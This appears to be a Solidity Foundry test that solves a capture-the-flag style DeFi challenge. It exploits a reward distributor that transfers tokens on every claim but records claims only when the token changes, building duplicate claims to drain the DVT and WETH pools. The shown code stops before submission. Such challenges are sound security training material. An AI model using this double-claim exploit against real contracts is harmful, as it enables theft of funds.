...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        // Bug: claimRewards() transfers tokens EVERY iteration, but _setClaimed()
        // only runs when the token switches OR on the final iteration. By
        // duplicating the same claim N times before switching token, we
        // transfer N times while only marking claimed once.
        ...
        // Compute how many duplicates drain each pool
        uint256 dvtRemaining = dvt.balanceOf(address(distributor));
        uint256 wethRemaining = weth.balanceOf(address(distributor));
        uint256 dvtDupes = dvtRemaining / PLAYER_DVT_AMOUNT;
        uint256 wethDupes = wethRemaining / PLAYER_WETH_AMOUNT;

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));

        // Build claims: all DVT dupes first (same token — no switch triggers _setClaimed),
        // then all WETH dupes.
        Claim[] memory claims = new Claim[](dvtDupes + wethDupes);
        ...
        for (uint256 i = 0; i < dvtDupes; i++) {
            claims[i] = Claim({batchNumber: 0, amount: PLAYER_DVT_AMOUNT, tokenIndex: 0, proof: dvtProof});
        }
        for (uint256 i = 0; i < wethDupes; i++) {
            claims[dvtDupes + i] = Claim({batchNumber: 0, amount: PLAYER_WETH_AMOUNT, tokenIndex: 1, proof: wethProof});
        }
